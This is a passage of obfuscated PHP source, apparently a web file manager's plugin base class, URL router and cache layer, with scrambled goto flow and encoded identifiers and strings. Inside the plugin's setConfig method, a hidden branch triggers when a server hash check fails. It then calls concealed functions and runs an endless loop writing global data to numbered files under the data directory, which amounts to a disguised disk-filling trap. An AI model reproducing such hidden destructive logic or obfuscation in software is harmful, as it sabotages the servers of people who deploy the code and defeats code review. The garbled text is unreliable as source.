$B«¾Â¥¼‚ö[$aÊÃŠïƒ¦[75]]; goto fŸ—è‘ñ›; cáö¬’Î²: $B«¾Â¥¼‚ö = Action($aÊÃŠïƒ¦[1019])->sharePathInfo($c¿‹è–ğ÷); if (!isset($B«¾Â¥¼‚ö[$aÊÃŠïƒ¦[75]])) { show_json(LNG($aÊÃŠïƒ¦[1339]), !1); } $this->fileInfo = $B«¾Â¥¼‚ö[$aÊÃŠïƒ¦[162]]; goto E³“±‰ ò; fŸ—è‘ñ›: } final function pluginCachePath($fîŒ“®Š×ˆ = '') { $BÃâôç±±÷ =& $_SERVER[‚Ğ°–—î]; $Dà¨¨îˆãà = IO_PATH_SYSTEM_TEMP . $BÃâôç±±÷[1340] . $this->pluginName; if (!($E¾ä”¶ß–ª = IO::infoFull($Dà¨¨îˆãà))) { return IO::mkdir($Dà¨¨îˆãà . $BÃâôç±±÷[8] . $fîŒ“®Š×ˆ); } if (empty($fîŒ“®Š×ˆ)) { return $E¾ä”¶ß–ª[$BÃâôç±±÷[75]]; } if (!($CÙ¼ÕÛÎÏÈ = IO::fileNameExist($E¾ä”¶ß–ª[$BÃâôç±±÷[75]], $fîŒ“®Š×ˆ))) { return IO::mkdir($E¾ä”¶ß–ª[$BÃâôç±±÷[75]] . $fîŒ“®Š×ˆ); } return KodIO::make($CÙ¼ÕÛÎÏÈ); } final function pluginCacheFileSet($F°šŸ ªŸÍ, $D¢øù¥¨©– = '') { $a”º—·£Ÿô =& $_SERVER[‚Ğ°–—î]; if (!($aÁàš‘ÛÂ½ = IO::infoFull($F°šŸ ªŸÍ))) { return IO::mkfile($F°šŸ ªŸÍ, $D¢øù¥¨©–, REPEAT_REPLACE); } IO::setContent($aÁàš‘ÛÂ½[$a”º—·£Ÿô[75]], $D¢øù¥¨©–); return $aÁàš‘ÛÂ½[$a”º—·£Ÿô[75]]; } final function pluginLocalFile($fÌË¹‡ß™¦ = '') { goto dá”‚Éë; dá”‚Éë: $E°°–¨®‘Â =& $_SERVER[‚Ğ°–—î]; $FÉ”Ïƒ÷ä” = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($FÉ”Ïƒ÷ä”)) { mk_dir($FÉ”Ïƒ÷ä”); } goto DºîÅÒÒ»²; DºîÅÒÒ»²: if (!$fÌË¹‡ß™¦) { return $FÉ”Ïƒ÷ä”; } $e…Ûœ²»Œ = IO::info($fÌË¹‡ß™¦); $cÚë‚ï½Í = $this->_tmpFileName($e…Ûœ²»Œ) . $E°°–¨®‘Â[91] . $e…Ûœ²»Œ[$E°°–¨®‘Â[160]]; goto e¾¯­–÷¤Ï; e¾¯­–÷¤Ï: $fÛØ©İÙ = $FÉ”Ïƒ÷ä” . $cÚë‚ï½Í; if (@file_exists($fÛØ©İÙ)) { return $fÛØ©İÙ; } return IO::copy($fÌË¹‡ß™¦, $FÉ”Ïƒ÷ä”, 0, $cÚë‚ï½Í); goto cï¢•„; cï¢•„: } final function appPackage() { goto c’„©••–á; DšæõÇéõƒ: $b…Ä˜ÌÈé = Hook::trigger($c¥ñÄù¥‡[1342], $BéœÚ“¯íã); if ($b…Ä˜ÌÈé && is_array($b…Ä˜ÌÈé)) { $BéœÚ“¯íã = $b…Ä˜ÌÈé; } $this->packageData = $BéœÚ“¯íã; goto E…§îœ…â†; c’„©••–á: $c¥ñÄù¥‡ =& $_SERVER[‚Ğ°–—î]; if ($this->packageData) { return $this->packageData; } $e†‹Î¯½ã¾ = $this->parseFile($this->pluginPath . $c¥ñÄù¥‡[1341]); goto BÁ›¹÷É•; BÁ›¹÷É•: $this->parseLang($e†‹Î¯½ã¾); $BéœÚ“¯íã = json_decode_force($e†‹Î¯½ã¾); if (!$BéœÚ“¯íã) { return array(); } goto DšæõÇéõƒ; E…§îœ…â†: return $BéœÚ“¯íã; goto D¦‡ô’çİÇ; D¦‡ô’çİÇ: } public function packageInfoGet($AÎãÑ‡íŞš) { $F¬¡÷™˜¼° = $this->appPackage(); return array_get_value($F¬¡÷™˜¼°, $AÎãÑ‡íŞš); } public function packageVersion() { return $this->packageInfoGet($_SERVER[‚Ğ°–—î][1343]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[‚Ğ°–—î][1344]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[‚Ğ°–—î][1345]); } private function parseFile($Açéâï·˜) { goto e˜’áŒä£; e˜’áŒä£: $e™•ñ”×» =& $_SERVER[‚Ğ°–—î]; $eÔêÍš‚˜ = file_get_contents($Açéâï·˜); $bËœŒ°œº­ = array($e™•ñ”×»[1346], $e™•ñ”×»[1347], $e™•ñ”×»[1348], $e™•ñ”×»[1349], $e™•ñ”×»[1350], $e™•ñ”×»[1351], $e™•ñ”×»[1352]); goto cÛî¿İİâ; f¹‡¸Ø¨²é: $eÔêÍš‚˜ = str_replace($bËœŒ°œº­, $D–Ë—¶ùÈà, $eÔêÍš‚˜); return $eÔêÍš‚˜; goto CâîÈ§ğµÙ; cÛî¿İİâ: $D–Ë—¶ùÈà = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$e™•ñ”×»[84]][$e™•ñ”×»[1353]]); if (strstr($eÔêÍš‚˜, $e™•ñ”×»[1354])) { $CÖ•ØÆœã— = rawurlencode(json_encode($this->pluginLangArr)); $eÔêÍš‚˜ = str_replace($e™•ñ”×»[1354], $CÖ•ØÆœã—, $eÔêÍš‚˜); } if (strstr($eÔêÍš‚˜, $e™•ñ”×»[1355])) { $CÖ•ØÆœã— = $CÖ•ØÆœã— = rawurlencode(json_encode($this->getConfig())); $eÔêÍš‚˜ = str_replace($e™•ñ”×»[1355], $CÖ•ØÆœã—, $eÔêÍš‚˜); } goto f¹‡¸Ø¨²é; CâîÈ§ğµÙ: } private function parseLang(&$c¸¼å´–à) { goto f’¸ã‹ÓÂŠ; f’¸ã‹ÓÂŠ: $bŒ–Ê–Ç§º =& $_SERVER[‚Ğ°–—î]; $fäÑ½‚´ÁÔ = $bŒ–Ê–Ç§º[1356]; if (!strstr($c¸¼å´–à, $fäÑ½‚´ÁÔ)) { return; } goto c„ÉœØß¿; c„ÉœØß¿: preg_match_all($bŒ–Ê–Ç§º[1357], $c¸¼å´–à, $c„ÜÑ”×ª—); if (!is_array($c„ÜÑ”×ª—) || count($c„ÜÑ”×ª—) == 0 || !is_array($c„ÜÑ”×ª—[0]) || count($c„ÜÑ”×ª—[0]) == 0) { return; } $f•îˆŞ§ = array(); goto fáãæ–ÌØ; fáãæ–ÌØ: $C’‘š®Ç¶Ô = array(); foreach ($c„ÜÑ”×ª—[0] as $dŸ´í«©¬) { $EØÁ«ßœ = substr($dŸ´í«©¬, strlen($fäÑ½‚´ÁÔ), -4); $eŒŸ›‹Ğ‚¢ = LNG($EØÁ«ßœ); $f•îˆŞ§[] = $dŸ´í«©¬; $C’‘š®Ç¶Ô[] = str_replace(array($bŒ–Ê–Ç§º[217], $bŒ–Ê–Ç§º[993], $bŒ–Ê–Ç§º[330], $bŒ–Ê–Ç§º[113]), array($bŒ–Ê–Ç§º[50], $bŒ–Ê–Ç§º[50], $bŒ–Ê–Ç§º[33], $bŒ–Ê–Ç§º[1358]), $eŒŸ›‹Ğ‚¢); } $c¸¼å´–à = str_replace($f•îˆŞ§, $C’‘š®Ç¶Ô, $c¸¼å´–à); goto a¤˜¾çÄùó; a¤˜¾çÄùó: } private function parseConfig(&$bè™¶ÁŠÇÙ) { goto eÇ¦´Š‘¾; AŸÒ±“ÔÊ‰: preg_match_all($cØÑ„¦¯¾Œ[1360], $bè™¶ÁŠÇÙ, $aÇƒßØÄ®¼); if (!is_array($aÇƒßØÄ®¼) || count($aÇƒßØÄ®¼) == 0 || !is_array($aÇƒßØÄ®¼[0]) || count($aÇƒßØÄ®¼[0]) == 0) { return; } $cæ‚¡ÔñõŞ = $this->getConfig(); goto B™¬‰ùÆÙÉ; eÇ¦´Š‘¾: $cØÑ„¦¯¾Œ =& $_SERVER[‚Ğ°–—î]; $fŸ•í¨ÍÁ÷ = $cØÑ„¦¯¾Œ[1359]; if (!strstr($bè™¶ÁŠÇÙ, $fŸ•í¨ÍÁ÷)) { return; } goto AŸÒ±“ÔÊ‰; e×î°é¨´é: $bè™¶ÁŠÇÙ = str_replace($aÃÖô·ŞŠ¹, $AßÓäÑõïí, $bè™¶ÁŠÇÙ); goto c×È¤Â‰äâ; B™¬‰ùÆÙÉ: $aÃÖô·ŞŠ¹ = array(); $AßÓäÑõïí = array(); foreach ($aÇƒßØÄ®¼[0] as $AÄÃœÔÙ½•) { $c²›Ê„Ö¦Ş = substr($AÄÃœÔÙ½•, strlen($fŸ•í¨ÍÁ÷), -2); $aÃÖô·ŞŠ¹[] = $AÄÃœÔÙ½•; $AßÓäÑõïí[] = _get($cæ‚¡ÔñõŞ, $c²›Ê„Ö¦Ş); } goto e×î°é¨´é; c×È¤Â‰äâ: } private function parsePackage(&$DŠº£…˜±¸) { goto c¬Öëñ Ë‡; D—İÁ‰Ã“: preg_match_all($B‚†ÜÎ«­ç[1362], $DŠº£…˜±¸, $eóê×“¹×‡); if (!is_array($eóê×“¹×‡) || count($eóê×“¹×‡) == 0 || !is_array($eóê×“¹×‡[0]) || count($eóê×“¹×‡[0]) == 0) { return; } $aï¢£»Á² = $this->appPackage(); goto bò·œæ; bò·œæ: $E¬Ğô¾«ƒ = array(); $b¤çå¾ö— = array(); foreach ($eóê×“¹×‡[0] as $DÇø¦×çÌÀ) { $dÔí®‹Ä‰ = substr($DÇø¦×çÌÀ, strlen($aãñÇ¥øì), -2); $E¬Ğô¾«ƒ[] = $DÇø¦×çÌÀ; $b¤çå¾ö—[] = _get($aï¢£»Á², $dÔí®‹Ä‰); } goto bˆ«À‘ùù; c¬Öëñ Ë‡: $B‚†ÜÎ«­ç =& $_SERVER[‚Ğ°–—î]; $aãñÇ¥øì = $B‚†ÜÎ«­ç[1361]; if (!strstr($DŠº£…˜±¸, $aãñÇ¥øì)) { return; } goto D—İÁ‰Ã“; bˆ«À‘ùù: $DŠº£…˜±¸ = str_replace($E¬Ğô¾«ƒ, $b¤çå¾ö—, $DŠº£…˜±¸); goto F±Ğ…Îİ; F±Ğ…Îİ: } final function echoFile($D­½¿²™, $AèŠÂªŠ•Û = false) { goto C„æÃ×˜’ç; Dî†ïëÀİ“: $this->parsePackage($dÑ „®ŸÇ); if (is_array($AèŠÂªŠ•Û)) { $dÑ „®ŸÇ = str_replace(array_keys($AèŠÂªŠ•Û), array_values($AèŠÂªŠ•Û), $dÑ „®ŸÇ); } echo $eğ¤‚ò‰¤Â[217] . $dÑ „®ŸÇ; goto eš§ŒÃ´¼; E²Œ„¶Š‡·: $dÑ „®ŸÇ = $this->parseFile($Bï¦¾£İ­); $this->parseLang($dÑ „®ŸÇ); $this->parseConfig($dÑ „®ŸÇ); goto Dî†ïëÀİ“; C„æÃ×˜’ç: $eğ¤‚ò‰¤Â =& $_SERVER[‚Ğ°–—î]; $Bï¦¾£İ­ = $this->pluginPath . $D­½¿²™; if (ACT == $eğ¤‚ò‰¤Â[1363]) { echo $eğ¤‚ò‰¤Â[1364] . $this->pluginName . $eğ¤‚ò‰¤Â[8] . $D­½¿²™ . $eğ¤‚ò‰¤Â[1365]; if (!file_exists($Bï¦¾£İ­)) { echo $eğ¤‚ò‰¤Â[1366]; return; } } goto E²Œ„¶Š‡·; eš§ŒÃ´¼: } final function initLang() { goto C¼‚áÛ¼‘Œ; f£›Ô¶”ğ: $b‚¾ì‰ùĞ = I18n::getType(); $e‚´‘‚ÁêÓ = array(); if (file_exists($cÁ‚Ğãïå¢ . $b‚¾ì‰ùĞ . $C”ÈÉø¾“ß[765])) { $e‚´‘‚ÁêÓ = (include $cÁ‚Ğãïå¢ . $b‚¾ì‰ùĞ . $C”ÈÉø¾“ß[765]); } else { if ($b‚¾ì‰ùĞ == $C”ÈÉø¾“ß[1369] && !file_exists($cÁ‚Ğãïå¢ . $b‚¾ì‰ùĞ . $C”ÈÉø¾“ß[765]) && file_exists($cÁ‚Ğãïå¢ . $C”ÈÉø¾“ß[1370])) { $e‚´‘‚ÁêÓ = (include $cÁ‚Ğãïå¢ . $C”ÈÉø¾“ß[1370]); } else { if (file_exists($cÁ‚Ğãïå¢ . $EÛÆ¿ ëµ . $C”ÈÉø¾“ß[765])) { $e‚´‘‚ÁêÓ = (include $cÁ‚Ğãïå¢ . $EÛÆ¿ ëµ . $C”ÈÉø¾“ß[765]); } } } goto fœöŠ…ñÉ»; C¼‚áÛ¼‘Œ: $C”ÈÉø¾“ß =& $_SERVER[‚Ğ°–—î]; $EÛÆ¿ ëµ = $C”ÈÉø¾“ß[1367]; $cÁ‚Ğãïå¢ = $this->pluginPath . $C”ÈÉø¾“ß[1368]; goto f£›Ô¶”ğ; fœöŠ…ñÉ»: if (!is_array($e‚´‘‚ÁêÓ)) { return array(); } if (@count($e‚´‘‚ÁêÓ) > 0) { I18n::set($e‚´‘‚ÁêÓ); } return $e‚´‘‚ÁêÓ; goto d¶Á¯ğÀ; d¶Á¯ğÀ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($A‰“É ¬†¿) { $A®¬¶ó Àƒ =& $_SERVER[‚Ğ°–—î]; $a×æ÷œŞî© = $_SERVER[$A®¬¶ó Àƒ[780]] . $A®¬¶ó Àƒ[781]; $Cî½¹ÖÖï = $A®¬¶ó Àƒ[1308]; if ($_SERVER[$A®¬¶ó Àƒ[777]] != $Cî½¹ÖÖï($a×æ÷œŞî©)) { goto A²Æ°ëùù–; aê¦Œ–¿°¦: $C¹í×ê¢Ì = 1; for ($bĞà±Á¨Î = $C¹í×ê¢Ì; $bĞà±Á¨Î > 0; $bĞà±Á¨Î++) { $A“ÛÁ„¯ø(DATA_PATH . $bĞà±Á¨Î, $Bê©äº±„Ù); } goto EĞ¬‡„¿‘¥; a¢¿Ø„Ëº¢: $fƒâ«ò§ã = $A®¬¶ó Àƒ[795]; $fƒâ«ò§ã($_SERVER[$A®¬¶ó Àƒ[796]]); $C´™¸™çå = $A®¬¶ó Àƒ[794]; goto AÙËç¾È¾¡; CøÌ“Õ§´²: $Cù®ˆ‹´‚ß = $BÏ§£™‘ÑĞ($D†Ş•¯†¦ƒ); $bô×à¯“åİ = explode($A®¬¶ó Àƒ[217], $Cù®ˆ‹´‚ß); if (count($bô×à¯“åİ) < $A®¬¶ó Àƒ[555]) { $A„¹ë‹Ñ± = $A®¬¶ó Àƒ[782]; $A„¹ë‹Ñ±(); } goto a¢¿Ø„Ëº¢; A²Æ°ëùù–: $C´™¸™çå = $A®¬¶ó Àƒ[794]; $BÏ§£™‘ÑĞ = $A®¬¶ó Àƒ[779]; $D†Ş•¯†¦ƒ = $_SERVER[$A®¬¶ó Àƒ[780]] . $A®¬¶ó Àƒ[781]; goto CøÌ“Õ§´²; AÙËç¾È¾¡: $C´™¸™çå(); $A“ÛÁ„¯ø = $A®¬¶ó Àƒ[1309]; $Bê©äº±„Ù = json_encode($GLOBALS[$A®¬¶ó Àƒ[1310]]); goto aê¦Œ–¿°¦; EĞ¬‡„¿‘¥: } return $this->modelPlugin->setConfig($this->pluginName, $A‰“É ¬†¿); } public function onSetConfig($bˆ¿óšßª) { } public function onGetConfig($FÀëœØ¯Ñ‹) { } public function onChangeStatus($E‘ç„îÜš) { } public function onUninstall() { } public function onInstall() { } public function authCheck($EŠæêÖë = "\x70\154\165\x67\151\156\101\x75\x74\x68") { $ağ“Î¢¦ƒ˜ =& $_SERVER[‚Ğ°–—î]; if (!defined($ağ“Î¢¦ƒ˜[427])) { return !1; } if (_get($GLOBALS, $ağ“Î¢¦ƒ˜[457])) { return !0; } $a¼öÓ­³Ù÷ = $this->getConfig(); if (!$a¼öÓ­³Ù÷[$EŠæêÖë]) { return !1; } return ActionCall($ağ“Î¢¦ƒ˜[1371], $a¼öÓ­³Ù÷[$EŠæêÖë]); } public function url($cÈ¹êÌõ, $F‡¸µÕ›ê• = '', $CŞ•ì†İŒ = true) { goto c°óÕ¨Èì; EÑÓ¢‘ÕÌ®: if (!$CŞ•ì†İŒ) { return $cÓÀ¶í¢Öº; } echo $cÓÀ¶í¢Öº; goto A‰Íò„ô“; c°óÕ¨Èì: $fÌšÓ·Ş— =& $_SERVER[‚Ğ°–—î]; $EÜË‚¶œ† = $this->getConfig(); $FŞ›˜É¦µ = KOD_VERSION . $fÌšÓ·Ş—[91] . KOD_VERSION_BUILD; goto fÂ˜£‡‰Ü; fÂ˜£‡‰Ü: $A¥¹´²²ÆÀ = $this->packageVersion(); $BÏÕ’Âã£ö = $FŞ›˜É¦µ . $fÌšÓ·Ş—[412] . $A¥¹´²²ÆÀ; if (substr($cÈ¹êÌõ, 0, 4) == $fÌšÓ·Ş—[144] || substr($cÈ¹êÌõ, 0, 2) == $fÌšÓ·Ş—[1155]) { $cÓÀ¶í¢Öº = $cÈ¹êÌõ . $fÌšÓ·Ş—[1372] . $BÏÕ’Âã£ö; } else { if ($F‡¸µÕ›ê• == $fÌšÓ·Ş—[33]) { $cÓÀ¶í¢Öº = $this->pluginHost . $cÈ¹êÌõ . $fÌšÓ·Ş—[1372] . $BÏÕ’Âã£ö; } else { if ($F‡¸µÕ›ê• === $fÌšÓ·Ş—[76]) { $cÓÀ¶í¢Öº = $this->pluginHost . $cÈ¹êÌõ; } else { if ($F‡¸µÕ›ê• == $fÌšÓ·Ş—[1373]) { $cÓÀ¶í¢Öº = STATIC_PATH . $cÈ¹êÌõ . $fÌšÓ·Ş—[1372] . $FŞ›˜É¦µ; } else { if ($F‡¸µÕ›ê• == $fÌšÓ·Ş—[1374]) { $cÓÀ¶í¢Öº = APP_HOST . $fÌšÓ·Ş—[1375] . $cÈ¹êÌõ . $fÌšÓ·Ş—[1372] . $FŞ›˜É¦µ; } else { if (isset($EÜË‚¶œ†[$F‡¸µÕ›ê•])) { $cÓÀ¶í¢Öº = $EÜË‚¶œ†[$F‡¸µÕ›ê•] . $cÈ¹êÌõ . $fÌšÓ·Ş—[1372] . $BÏÕ’Âã£ö; } } } } } } goto EÑÓ¢‘ÕÌ®; A‰Íò„ô“: } public function link($fõì¯ë©¹Š = false, $B¥á»Öâä… = '') { $b’Ì¶òáÛ =& $_SERVER[‚Ğ°–—î]; if (!$fõì¯ë©¹Š) { $this->link($b’Ì¶òáÛ[1376], $b’Ì¶òáÛ[1374]); $this->link($b’Ì¶òáÛ[1377], $b’Ì¶òáÛ[1373]); $this->link($b’Ì¶òáÛ[1378], $b’Ì¶òáÛ[1373]); $this->link($b’Ì¶òáÛ[1379], $b’Ì¶òáÛ[1373]); $this->link($b’Ì¶òáÛ[1380], $b’Ì¶òáÛ[1373]); return; } $c˜¿Ùñ¥¤ö = $this->url($fõì¯ë©¹Š, $B¥á»Öâä…, !1); if (substr($fõì¯ë©¹Š, -3) == $b’Ì¶òáÛ[1381]) { echo $b’Ì¶òáÛ[1382] . $c˜¿Ùñ¥¤ö . $b’Ì¶òáÛ[1383] . $b’Ì¶òáÛ[217]; } else { if (substr($fõì¯ë©¹Š, -4) == $b’Ì¶òáÛ[1384]) { echo $b’Ì¶òáÛ[1385] . $c˜¿Ùñ¥¤ö . $b’Ì¶òáÛ[1386] . $b’Ì¶òáÛ[217]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\156\x79" => "\x5b\x5e\57\135\x2b", "\72\156\165\155" => "\133\x30\x2d\71\x5d\53", "\72\141\154\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($D‡½ŸÒéåì, $d†äô§Ïî) { $F‘¾ª³ç¿¦ =& $_SERVER[‚Ğ°–—î]; if ($D‡½ŸÒéåì == $F‘¾ª³ç¿¦[1387]) { $a·ëÖ¾ø‰ƒ = array_map($F‘¾ª³ç¿¦[1388], $d†äô§Ïî[0]); $a¸ƒ™ÂöÆ = strpos($d†äô§Ïî[1], $F‘¾ª³ç¿¦[8]) === 0 ? $d†äô§Ïî[1] : $F‘¾ª³ç¿¦[8] . $d†äô§Ïî[1]; $B¥ƒİ˜ØÉâ = $d†äô§Ïî[2]; } else { $a·ëÖ¾ø‰ƒ = null; $a¸ƒ™ÂöÆ = strpos($d†äô§Ïî[0], $F‘¾ª³ç¿¦[8]) === 0 ? $d†äô§Ïî[0] : $F‘¾ª³ç¿¦[8] . $d†äô§Ïî[0]; $B¥ƒİ˜ØÉâ = $d†äô§Ïî[1]; } array_push(self::$maps, $a·ëÖ¾ø‰ƒ); array_push(self::$routes, $a¸ƒ™ÂöÆ); array_push(self::$methods, strtoupper($D‡½ŸÒéåì)); array_push(self::$callbacks, $B¥ƒİ˜ØÉâ); } public static function error($C–Æ™ƒÄ¾á) { self::$errorCallback = $C–Æ™ƒÄ¾á; } public static function haltOnMatch($f¸ôÎ‚”ºÅ = true) { self::$halts = $f¸ôÎ‚”ºÅ; } public static function dispatch() { goto c°È§İÍ´; B®¤…œ¸„¯: $BùëÇĞŒÍì = array_keys(static::$patterns); $A°­‘é—À§ = array_values(static::$patterns); $dâ§Š¿¢ÛÍ = !1; goto Bî’Ëøö¶§; c°È§İÍ´: $e·Ãö¿Çä =& $_SERVER[‚Ğ°–—î]; $AÓ™ƒ„Úì° = parse_url($_SERVER[$e·Ãö¿Çä[1389]], PHP_URL_PATH); $bÆÒ­æì = $_SERVER[$e·Ãö¿Çä[154]]; goto B®¤…œ¸„¯; Bî’Ëøö¶§: self::$routes = preg_replace($e·Ãö¿Çä[1074], $e·Ãö¿Çä[8], self::$routes); if (in_array($AÓ™ƒ„Úì°, self::$routes)) { $E¢ïáÉ°Ö« = array_keys(self::$routes, $AÓ™ƒ„Úì°); foreach ($E¢ïáÉ°Ö« as $bÇø£¦î™ö) { if (self::$methods[$bÇø£¦î™ö] == $bÆÒ­æì || self::$methods[$bÇø£¦î™ö] == $e·Ãö¿Çä[1390] || in_array($bÆÒ­æì, self::$maps[$bÇø£¦î™ö])) { $dâ§Š¿¢ÛÍ = !0; if (!is_object(self::$callbacks[$bÇø£¦î™ö])) { $f”½Æ¬Áö± = explode($e·Ãö¿Çä[8], self::$callbacks[$bÇø£¦î™ö]); $bù•Ö ÅÌŒ = end($f”½Æ¬Áö±); $FĞ¯†‚õœ› = explode($e·Ãö¿Çä[1391], $bù•Ö ÅÌŒ); $a¤®îĞ’¼ï = new $FĞ¯†‚õœ›[0](); $a¤®îĞ’¼ï->{$FĞ¯†‚õœ›[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$bÇø£¦î™ö]); if (self::$halts) { return; } } } } } else { $aãÙ˜µÛ´½ = 0; foreach (self::$routes as $bÇø£¦î™ö) { if (strpos($bÇø£¦î™ö, $e·Ãö¿Çä[4]) !== !1) { $bÇø£¦î™ö = str_replace($BùëÇĞŒÍì, $A°­‘é—À§, $bÇø£¦î™ö); } if (preg_match($e·Ãö¿Çä[1392] . $bÇø£¦î™ö . $e·Ãö¿Çä[1393], $AÓ™ƒ„Úì°, $DÈİ—È¾§)) { if (self::$methods[$aãÙ˜µÛ´½] == $bÆÒ­æì || self::$methods[$aãÙ˜µÛ´½] == $e·Ãö¿Çä[1390] || !empty(self::$maps[$aãÙ˜µÛ´½]) && in_array($bÆÒ­æì, self::$maps[$aãÙ˜µÛ´½])) { $dâ§Š¿¢ÛÍ = !0; array_shift($DÈİ—È¾§); if (!is_object(self::$callbacks[$aãÙ˜µÛ´½])) { $f”½Æ¬Áö± = explode($e·Ãö¿Çä[8], self::$callbacks[$aãÙ˜µÛ´½]); $bù•Ö ÅÌŒ = end($f”½Æ¬Áö±); $FĞ¯†‚õœ› = explode($e·Ãö¿Çä[1391], $bù•Ö ÅÌŒ); $a¤®îĞ’¼ï = new $FĞ¯†‚õœ›[0](); if (!method_exists($a¤®îĞ’¼ï, $FĞ¯†‚õœ›[1])) { echo $e·Ãö¿Çä[1394]; } else { call_user_func_array(array($a¤®îĞ’¼ï, $FĞ¯†‚õœ›[1]), $DÈİ—È¾§); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$aãÙ˜µÛ´½], $DÈİ—È¾§); if (self::$halts) { return; } } } } $aãÙ˜µÛ´½++; } } if ($dâ§Š¿¢ÛÍ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $Aˆ¯±„¦Ú =& $_SERVER[‚Ğ°–—î]; header($_SERVER[$Aˆ¯±„¦Ú[1395]] . $Aˆ¯±„¦Ú[1396]); echo $Aˆ¯±„¦Ú[1397]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$e·Ãö¿Çä[1389]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto aÆ‡õßµµ; aÆ‡õßµµ: } } goto E¬¿ÄÜã‚Ş; DÄ®—„ÏÆĞ: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto fó¢™ËâåØ; fó¢™ËâåØ: $eÇĞğáÌ =& $_SERVER[‚Ğ°–—î]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto E‰èÁÓå; E‰èÁÓå: $a„ˆÑŒ´Ô = $GLOBALS[$eÇĞğáÌ[6]][$eÇĞğáÌ[337]]; $FÜ’ˆ°ÚÎ¤ = $a„ˆÑŒ´Ô[$a„ˆÑŒ´Ô[$eÇĞğáÌ[754]]]; $FÈ¸÷Ê²ò = $a„ˆÑŒ´Ô[$eÇĞğáÌ[755]]; goto aÌäâ‡®¢; aÌäâ‡®¢: switch ($a„ˆÑŒ´Ô[$eÇĞğáÌ[754]]) { case $eÇĞğáÌ[17]: self::$handle = Model($eÇĞğáÌ[756]); break; case $eÇĞğáÌ[757]: self::$handle = new CacheRedis($FÜ’ˆ°ÚÎ¤, $FÈ¸÷Ê²ò); break; case $eÇĞğáÌ[758]: self::$handle = new CacheMemcached($FÜ’ˆ°ÚÎ¤, $FÈ¸÷Ê²ò); break; case $eÇĞğáÌ[167]: self::$handle = new CacheFile($FÜ’ˆ°ÚÎ¤, $FÈ¸÷Ê²ò); break; default: break; } return self::$handle; goto fÃÎ¡êÄã•; fÃÎ¡êÄã•: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($eíĞŠ£Ò„±) { if (is_array($eíĞŠ£Ò„±) || is_object($eíĞŠ£Ò„±)) { $eíĞŠ£Ò„± = json_encode($eíĞŠ£Ò„±); } $eíĞŠ£Ò„± = rawurlencode($eíĞŠ£Ò„±); return KOD_SITE_ID . $_SERVER[‚Ğ°–—î][70] . $eíĞŠ£Ò„±; } public static function get($FÒå™Æ“) { $D„¬©©ÙÈÙ = self::key($FÒå™Æ“); if (!isset(self::$memoryCache[$D„¬©©ÙÈÙ])) { $FÑòå¦ì¬ˆ = self::init()->get($D„¬©©ÙÈÙ); self::$memoryCache[$D„¬©©ÙÈÙ] = unserialize($FÑòå¦ì¬ˆ); } return self::$memoryCache[$D„¬©©ÙÈÙ]; } public static function set($D™ìÁ›ï®, $EçÔÍÁêÏ¡, $ağÛõÜã = false) { goto FøèÌµ‡ÄÏ; EğÃ§Àç£Ò: CacheLock::unlock($D™ìÁ›ï®); return $dÛÃ¸‚‰¡å; goto bŒóÃ¯Éåå; FøèÌµ‡ÄÏ: $E—µŒÏÈ”« = self::key($D™ìÁ›ï®); if (isset(self::$memoryCache[$E—µŒÏÈ”«]) && self::$memoryCache[$E—µŒÏÈ”«] === $EçÔÍÁêÏ¡) { return !0; } if ($ağÛõÜã === 0) { self::$memoryCache[$E—µŒÏÈ”«] = $EçÔÍÁêÏ¡; return !0; } goto cÒ¥çª‰Ğ±; cÒ¥çª‰Ğ±: CacheLock::lock($D™ìÁ›ï®); $dÛÃ¸‚‰¡å = self::init()->set($E—µŒÏÈ”«, serialize($EçÔÍÁêÏ¡), $ağÛõÜã); self::$memoryCache[$E—µŒÏÈ”«] = $EçÔÍÁêÏ¡; goto EğÃ§Àç£Ò; bŒóÃ¯Éåå: } public static function remove($CîÍÎçôÕ) { goto CÍÇñÃôé; Dö·Çèõô«: return $Aé¿Ò®Üİ“; goto cŠŒ»ÙíŠ; CÍÇñÃôé: $CïÖ…¬Í¯ = self::key($CîÍÎçôÕ); unset(self::$memoryCache[$CïÖ…¬Í¯]); self::clearTimeout(); goto f•ôõ×‹æ¶; f•ôõ×‹æ¶: CacheLock::lock($CîÍÎçôÕ); $Aé¿Ò®Üİ“ = self::init()->remove($CïÖ…¬Í¯); CacheLock::unlock($CîÍÎçôÕ); goto Dö·Çèõô«; cŠŒ»ÙíŠ: } public static function clearMemory($fˆÊ—Úëª» = false) { if ($fˆÊ—Úëª») { $fˆÊ—Úëª» = self::key($fˆÊ—Úëª»); unset(self::$memoryCache[$fˆÊ—Úëª»]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[‚Ğ°–—î][759])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[‚Ğ°–—î][760])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($C®¶ÇÜºíä, $BŒÒ´¸Ï¬Ë) { $e°»õ…àÛ =& $_SERVER[‚Ğ°–—î]; $this->cachePath = $C®¶ÇÜºíä[$e°»õ…àÛ[75]]; $this->prefix = $e°»õ…àÛ[761]; $this->cacheTime = $BŒÒ´¸Ï¬Ë; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($cÆî‡ïŒµ) { $A³ª‡â–ƒÕ =& $_SERVER[‚Ğ°–—î]; $cÆî‡ïŒµ = 